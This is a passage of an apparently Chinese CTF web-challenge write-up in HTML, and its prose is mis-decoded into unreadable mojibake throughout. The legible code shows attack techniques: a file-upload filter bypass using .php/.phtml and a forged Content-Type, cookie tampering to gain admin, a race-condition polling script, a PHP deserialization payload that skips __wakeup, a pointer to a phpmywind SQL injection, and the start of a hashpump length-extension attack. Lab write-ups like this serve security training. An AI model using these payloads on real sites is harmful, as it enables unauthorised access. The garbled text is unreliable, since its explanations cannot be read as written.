class="comment">#print file_name</span></span><br><span class="line"><span class="keyword">with</span> open(file_name, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">   file_content = code.write(ans.content)</span><br><span class="line">   code.close()</span><br><span class="line">   <span class="keyword">print</span> file_name</span><br><span class="line">   f = open(file_name,<span class="string">'rb'</span>)</span><br><span class="line">   read_content = f.read()</span><br><span class="line">   <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> read_content:  </span><br><span class="line">   <span class="keyword">print</span> read_content</span><br><span class="line">   <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">print</span> <span class="string">'Waiting!!!!!'</span></span><br><span class="line">   f.close()</span><br></pre></td></tr></table></figure></p><p>ç»“æœåº”è¯¥æ˜¯ç¬¬998ä¸ªbakæ–‡ä»¶é‡Œé¢æœ‰flag<br><img src="https://s1.ax1x.com/2018/09/30/il7gw4.png" alt="il7gw4.png"></p><h4 id="ä¸Šä¼ ä¸€"><a href="#ä¸Šä¼ ä¸€" class="headerlink" title="ä¸Šä¼ ä¸€"></a>ä¸Šä¼ ä¸€</h4><p>æ‰“å¼€é¡µé¢è®©æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶ï¼Œå°è¯•ç”¨bpæŠ“åŒ…å‘åŒ…<br>å‘ç°<br><img src="https://s1.ax1x.com/2018/09/30/il72TJ.png" alt="il72TJ.png"><br>æ‰€ä»¥å°±æ˜¯è®©æˆ‘ä»¬ä¸Šä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶ï¼Œé‚£å°±å°è¯•æŠŠåç¼€åæ”¹åä¸ºphpï¼Œç„¶åå°±å¾—åˆ°ä¸¤ä¸ªflagäº†ï¼Œè¿™å¤ªæ°´äº†å§ï¼Œè¿™é¢˜è¿˜é€ä¸€ä¸ªflagã€‚ã€‚ã€‚ã€‚ä¸Šä¼ äºŒä¹Ÿç§’æ‰äº†<br><a href="https://imgchr.com/i/il7Wk9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7Wk9.md.png" alt="il7Wk9.md.png"></a></p><h4 id="ä¸Šä¼ äºŒ"><a href="#ä¸Šä¼ äºŒ" class="headerlink" title="ä¸Šä¼ äºŒ"></a>ä¸Šä¼ äºŒ</h4><p>å…¶å®ä¹Ÿæ˜¯ä¸Šä¼ ä¸€çš„é¡µé¢ï¼Œè¿™ä¸ªé¢˜ç›®å…¶å®æƒ³è¦ä¿®æ”¹çš„æ˜¯Content-Type:è¿™ä¸ªå‚æ•°ï¼Œç”±äºæˆ‘ä¸Šä¸€é¢˜æ˜¯ç›´æ¥ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ä¸Šå»çš„ï¼Œè¿™æ ·ä¸€æ¥å°±å¯¼è‡´ç›´æ¥å‡ºæ¥ä¸¤ä¸ªflagï¼Œè¿™é¢˜åªè¦æ˜¯Content-Type: image/jpegè¿™ä¸ªç±»å‹å°±å¯ä»¥å‡ºflagï¼Œå¦‚æœä¸€å¼€å§‹ä½ ä¸Šä¼ ä¸€ä¸Šä¼ çš„ä¸æ˜¯å›¾ç‰‡çš„è¯ï¼Œè€Œæ˜¯ä¸€èˆ¬çš„æ–‡ä»¶æµçš„è¯ä»¬è¿™é‡Œçš„Content-Typeæ˜¾ç¤ºçš„æ˜¯application/streamä¹‹ç±»çš„ä¸œè¥¿ï¼Œå°±ä¸ä¼šä¸¤ä¸ªflagå‡ºæ¥çš„<br><img src="https://s1.ax1x.com/2018/09/30/il7hf1.png" alt="il7hf1.png"></p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie?"></a>Cookie?</h4><p>é¡µé¢è¯·æ±‚ä»¥ç®¡ç†å‘˜èº«ä»½è¿›è¡Œç™»å½•ï¼Œå°è¯•ç”¨bpæŠ“åŒ…æŸ¥çœ‹<br>æŠŠåŒ…é‡Œé¢cookieé‡Œé¢çš„å€¼æ”¹ä¸€ä¸‹ï¼Œä¸€å¼€å§‹æ˜¯guestï¼Œæˆ‘ä»¬æ”¹æˆadminï¼Œå‘åŒ…<br>å¾—åˆ°ä¸‹é¢è¿™ä¸ªé¡µé¢<br><img src="https://s1.ax1x.com/2018/09/30/il7Il6.png" alt="il7Il6.png"><br>æœ‰ä¸ªkeyè¿˜æœ‰ä¸ªå¯†æ–‡ï¼ŒçŒœæµ‹æ˜¯åº”è¯¥æ˜¯ç»´å‰å°¼äºšå¯†ç ï¼ŒæŠŠè¯¥ç½‘é¡µä¸­çš„å›¾ç‰‡æ‹–åˆ°ç™¾åº¦è¯†å›¾è¯†åˆ«ä¸€ä¸‹ï¼Œæœç„¶æ˜¯ç»´å‰å°¼äºšã€‚ã€‚ã€‚<br><a href="https://imgchr.com/i/il7o6K" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7o6K.md.png" alt="il7o6K.md.png"></a></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥åœ¨çº¿è§£å¯†ï¼Œæˆ‘ä»¬å¯ä»¥å»è¿™ä¸ªé¡µé¢ <a href="http://ctf.ssleye.com/vigenere.html" target="_blank" rel="noopener">http://ctf.ssleye.com/vigenere.html</a> è¿›è¡Œç»´å‰å°¼äºšå¯†ç è§£å¯†<br>å¾—åˆ°flag<br><a href="https://imgchr.com/i/il7TOO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7TOO.md.png" alt="il7TOO.md.png"></a></p><h4 id="ä¸Šä¼ ä¸‰"><a href="#ä¸Šä¼ ä¸‰" class="headerlink" title="ä¸Šä¼ ä¸‰"></a>ä¸Šä¼ ä¸‰</h4><p>è¿™ä¸ªé¢˜ç›®å±äºæ¡ä»¶ç«äº‰çš„é¢˜ç›®<br>å…·ä½“æ¥è®²å°±æ˜¯åœ¨æ–‡ä»¶ä¸Šä¼ ä¹‹åä½ è¦èµ¶åœ¨æœåŠ¡å™¨æŠŠå®ƒåˆ é™¤ä¹‹å‰è®¿é—®ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥äº†<br>è¿™ä¸ªé¢˜ç›®æŠ“åŒ…çš„æ—¶å€™åˆåœ¨ç›¸åº”çš„phpæ–‡ä»¶åç¼€è¿›è¡Œäº†è¿‡æ»¤ï¼ŒæŠŠ<code>php,php2,php3,php4,php5</code>ç­‰éƒ½è¿‡æ»¤æ‰äº†ï¼Œç›´åˆ°è¯•åˆ°<code>phtml</code>çš„æ—¶å€™å›æ˜¾å‡ºæ¥ä¸€å¥è¯<br><a href="https://imgchr.com/i/il7b0e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7b0e.md.png" alt="il7b0e.md.png"></a><br>è¿™æ—¶å€™æˆ‘ä»¬å°±å‘ç°æ–‡ä»¶è¢«åˆ äº†<br>è¿™é¢˜å¯ä»¥å•çº¯ç”¨bpç›´æ¥åˆ·ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å–œæ¬¢ç”¨è„šæœ¬åˆ·ï¼Œå¯ä»¥ç›´æ¥å‡ºflagï¼Œbpåªèƒ½çœ‹åˆ°è¿”å›çš„é•¿åº¦ä¸å¥½è¾¨åˆ«<br>æˆ‘ä½¿ç”¨bp+è„šæœ¬åˆ·çš„ï¼Œbpä¸Šé¢å¼€ä¸ªæ— payloadçš„çˆ†ç ´ä¸€ç›´å‘åŒæ ·çš„åŒ…ï¼Œç„¶åè„šæœ¬ä¸€ç›´è¿è¡Œå°±å¯ä»¥å¾—åˆ°flagäº†</p><p><a href="https://imgchr.com/i/il7Okd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7Okd.md.png" alt="il7Okd.md.png"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://202.119.201.199/challenge/web/uploadfile/upload/index.phtml'</span></span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">ans = req.get(url)</span><br><span class="line">web_content = ans.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> web_content:</span><br><span class="line"><span class="keyword">print</span> web_content</span><br></pre></td></tr></table></figure></p><h4 id="å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡"><a href="#å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡" class="headerlink" title="å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡"></a>å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡</h4><p>å…ˆæŠŠæºä»£ç è´´ä¸€ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'flag'</span>)+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'dangerrous'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        var_dump(file_exists(<span class="keyword">$this</span>-&gt;file));</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)&amp;&amp;!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ä½ æƒ³å¹²å˜›'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'data'</span>])&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>æ‰“å¼€å¯ä»¥å‘ç°å‡½æ•°ï¼Œè¿™ä¸ªé¢˜ç›®è€ƒæŸ¥çš„æ˜¯ååºåˆ—åŒ–çš„çŸ¥è¯†ï¼Œè¿™é¢˜çš„å…³é”®å°±æ˜¯æˆ‘ä»¬éœ€è¦åˆ©ç”¨unserializeæ„é€ ä¸€ä¸ªå¯¹åº”çš„ç±»å‹çš„åºåˆ—åŒ–ç„¶åå»ç»•è¿‡wakeupå‡½æ•°ä»è€Œåˆ©ç”¨__destruct()è¾“å‡ºflagï¼Œç»•è¿‡wakeupå¾ˆç®€å•åªéœ€è¦æˆ‘ä»¬æŠŠå¯¹è±¡é‡Œé¢çš„çš„å˜é‡ä¸ªæ•°æ”¹ä¸ºè·ŸåŸæ¥çš„ä¸ä¸€æ ·å°±å¥½ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªä»£ç æ„é€ è¿™ä¸ªåºåˆ—äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Admin();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure></p><p>æŠŠè¾“å‡ºçš„å˜é‡ä¸ªæ•°æ”¹ä¸º2å³å¯<br><a href="https://imgchr.com/i/il7XtA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7XtA.md.png" alt="il7XtA.md.png"></a><br>ä¹Ÿå°±æ˜¯<br><code>O:5:&quot;Admin&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p><a href="https://imgchr.com/i/il7z1P" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7z1P.md.png" alt="il7z1P.md.png"></a></p><h4 id="è‡ªåŠ¨è·å–flagç¨‹åº"><a href="#è‡ªåŠ¨è·å–flagç¨‹åº" class="headerlink" title="è‡ªåŠ¨è·å–flagç¨‹åº"></a>è‡ªåŠ¨è·å–flagç¨‹åº</h4><p>è¿™ä¸ªé¢˜ç›®æœ¬æ¥æ„æ€å°±æ˜¯æƒ³è¦ä½ ä¿®æ”¹ä¸€ä¸‹ä»£ç ï¼Œæˆ‘ä»¬é‚£å¯ä»¥å³é”®å»çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€æ®µjsä»£ç ï¼Œæ˜¯é€šè¿‡ajaxæ¥å‘èµ·è¯·æ±‚çš„ï¼Œå‘ç°ç¬¬ä¸€éƒ¨åˆ†æ˜¯é€šè¿‡getæ–¹å¼è®¿é—®<code>param1.php</code>ç„¶åä»¥jsonæ ¼å¼çš„æ•°æ®ä¼ å‚ç»™<code>calParam2</code>ï¼Œç„¶åå»æ±‚flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¯·æ±‚å‚æ•°ä¸€</span></span><br><span class="line">$(<span class="string">"#a"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">'param1.php'</span>,</span><br><span class="line">method:<span class="string">'get'</span>,</span><br><span class="line">dataType:<span class="string">'json'</span>,</span><br><span class="line">success:calParam2</span><br><span class="line">&#125;)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calParam2</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> data=<span class="built_in">JSON</span>.parse((d.param));</span><br><span class="line"><span class="keyword">var</span> length=data.length;</span><br><span class="line"><span class="keyword">var</span> second=<span class="keyword">new</span> <span class="built_in">Date</span>().getSeconds();</span><br><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; length/<span class="number">2</span>; j++) &#123;</span><br><span class="line">sum+=<span class="built_in">parseInt</span>(data[i])*second + data[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¯·æ±‚flag</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">'http://new.ctf.param.com/aram2.php?sum='</span>+sum,</span><br><span class="line">method:<span class="string">'get'</span>,</span><br><span class="line">dataType:<span class="string">'json'</span>,</span><br><span class="line">success:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">alert(s.f);</span><br><span class="line">&#125;,</span><br><span class="line">error:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">alert(<span class="string">'é”™äº†'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç åæˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œé¢è¯·æ±‚flagçš„éƒ¨åˆ†æ˜æ˜¾urlå°±é”™äº†ï¼Œè¿™å°¼ç›æ ¹æœ¬å°±ä¸åŒåŸŸäº†ï¼Œä¸€èˆ¬å‡ºé¢˜äººè‚¯å®šä¸ä¼šè¿™æ ·æçš„,æ ¹æ®ç¬¬ä¸€ä¸ªurlæŠŠç¬¬äºŒä¸ªurlæ”¹ä¸ºå‚æ•°ä¸ºparamçš„urlï¼š<code>param2.php?param=&#39;+sum,</code><br>å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸‹param1.phpè¿™ä¸ªé¡µé¢çš„æ—¶å€™å‘ç°æ˜¯ä¸€å †urlç¼–ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;param&quot;:&quot;%5B%221%22%2C%226%22%2C%222%22%2C%228%22%2C%224%22%2C%222%22%2C%228%22%2C%224%22%2C%229%22%2C%221%22%2C%2210%22%5D&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯åœ¨è®¡ç®—çš„è¿™ä¸€éƒ¨åˆ†åŠŸèƒ½é‡Œé¢ä¸Šæ¥ç›´æ¥å°±<code>JSON.parse</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹jsonæ ¼å¼è§£ç çš„å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬ç¬¬ä¸€ä¸ªé¡µé¢é‡Œé¢çš„ä¸œè¥¿æ˜¯ç»è¿‡urlç¼–ç è¿‡çš„ï¼Œç›´æ¥jsonæ ¼å¼è§£ç è‚¯å®šæ˜¯ä¸è¡Œçš„çš„ã€‚ä¼šæŠ¥é”™çš„ã€‚<br><a href="https://imgchr.com/i/i8pukt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8pukt.md.png" alt="i8pukt.md.png"></a><br>æ‰€ä»¥æˆ‘ä»¬å¾—å…ˆç”¨<code>unescape</code>è§£ç ï¼Œç„¶åæ”¾è¿›æ§åˆ¶å°é‡Œé¢è·‘ä¸€ä¸‹å°±å¾—åˆ°flag<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calParam2</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">  d.param = <span class="built_in">unescape</span>(d.param);</span><br><span class="line"><span class="keyword">var</span> data=<span class="built_in">JSON</span>.parse((d.param));</span><br><span class="line"><span class="keyword">var</span> length=data.length;</span><br><span class="line"><span class="keyword">var</span> second=<span class="keyword">new</span> <span class="built_in">Date</span>().getSeconds();</span><br><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; length/<span class="number">2</span>; j++) &#123;</span><br><span class="line">sum+=<span class="built_in">parseInt</span>(data[i])*second + data[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¯·æ±‚flag</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">'param2.php?param='</span>+sum,</span><br><span class="line">method:<span class="string">'get'</span>,</span><br><span class="line">dataType:<span class="string">'json'</span>,</span><br><span class="line">success:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">alert(s.f);</span><br><span class="line">&#125;,</span><br><span class="line">error:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">alert(<span class="string">'é”™äº†'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="phpmywind"><a href="#phpmywind" class="headerlink" title="phpmywind"></a>phpmywind</h4><p>è¿™ä¸ªé¢˜ç›®ä¸ªè€ƒå¯Ÿçš„æ˜¯phpmywind5.3çš„æ¼æ´äº†<br>ä¸Šç½‘æœä¸€æ³¢ï¼Œå‘ç°å¤§æ¦‚å­˜åœ¨ä¸¤ä¸ªæ¼æ´å‰å°sqlæ³¨å…¥åŠåå°ä»»æ„æ–‡ä»¶éå†<br>ä½†æ˜¯ç”±äºé¢˜ç›®è¯´flagä»æ•°æ®åº“é‡Œé¢æ‰¾ï¼Œé‚£å°±è‚¯å®šæ˜¯æ³¨å…¥çš„æ¼æ´ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æœ‰é—®é¢˜ï¼Œç›´æ¥flagå°±ç»™å‡ºæ¥äº†ï¼Œæœ‰æ¯›ç—…ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/10/04/i8plp8.png" alt="i8plp8.png"><br>ç„¶åå°è¯•å¤ç°ä¸€ä¸‹ï¼Œå‘ç°è¿™å­¦æ ¡æ­çš„å¹³å°å‚æ•°å¥½åƒéƒ½ä¸ä¸€æ ·ã€‚ã€‚ã€‚ã€‚è‡ªå·±æ­çš„å¹³å°æ˜¯å¯ä»¥å¤ç°çš„ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚<br>è¯¦ç»†å¯ä»¥å‚è€ƒä¸€ä¸‹ <a href="http://www.logphp.com/?a=url&amp;k=430bac59&amp;u=aHR0cDovL3d3dy5iYWlkdS5jb20vbGluaz91cmw9bHRsdXdFNzhCYVN5YmFWVFhZUzEzSHFMTjVtTTV2SWg4bmlWb1o4Szg3T3hwNk83UWRGS0ZzcHlRbDJfWWNLQg==&amp;t=cGhwbXl3aW5kVjUuM!acgOaWsOa8j!a0nuWQiOmbhijliY3lj7BzcWzms6jlhaXlj4rlkI7lj7Dku7vmhI@mlofku7bpgY3ljoYpIC0gLi4u&amp;s=cGhwbXl3aW5kNS4zIOa8j!a0ng==" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a><br>æˆ‘ä»¬ç›´æ¥ç”¨æŠ¥é”™æ³¨å…¥å°±å¯ä»¥äº†</p><h4 id="is-hash-safe"><a href="#is-hash-safe" class="headerlink" title="is hash safe??"></a>is hash safe??</h4><p>è¿™é¢˜è€ƒçš„æ˜¯hashé•¿åº¦æ‹“å±•æ”»å‡»<br>ä¸€å¼€å§‹æŠ“åŒ…æŠŠcookieé‡Œé¢çš„<code>role</code>æ”¹ä¸º<code>admin</code>ï¼Œå‘åŒ…ä¸€çœ‹è¿˜æ˜¯æ²¡æœ‰ååº”ï¼Œé¢˜ç›®è¯´æœ‰ä¸œè¥¿æ¼äº†ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯æœ‰å¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•<code>phpsï¼Œphp~</code>æ— æœåå°è¯•<code>.swp</code>å‡ºç°ä»£ç äº†<br>æˆ‘ä»¬å¯ä»¥ç”¨<code>vim -r</code>å‘½ä»¤å»å›å¤å¤‡ä»½æ–‡ä»¶<code>vim -r admin.php.swp</code><br>å‡ºç°æºä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">                $role = <span class="string">"guest"</span>;</span><br><span class="line">                $salt =<span class="string">"xxxxxxxxxxxxx"</span>;<span class="comment">//len:13</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                        $role = $_COOKIE[<span class="string">"role"</span>];</span><br><span class="line">                        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">                        <span class="keyword">if</span> (stripos($role,<span class="string">"admin"</span>)!==<span class="keyword">false</span>&amp;&amp;$hsh === md5($salt.$_COOKIE[<span class="string">"role"</span>]))</span><br><span class="line">                        &#123;</span><br><span class="line">                                $auth = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                                $auth = <span class="keyword">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                        $s = $role;</span><br><span class="line">                        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">                        $hsh = md5($salt.$s);</span><br><span class="line">                        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin.Your flag is cumtctf&#123;you_know_this_is_not_the_flag&#125;"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å¯ç”¨<code>hashpump</code>è¿™ä¸ªå·¥å…·æ¥ä¼ªé€ <code>admin</code>çš„èº«ä»½ï¼Œè®°å¾—è¦æŠŠæ•°æ®URLç¼–ç ä¸€ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hashpump</span><br><span class="line">Input Signature: 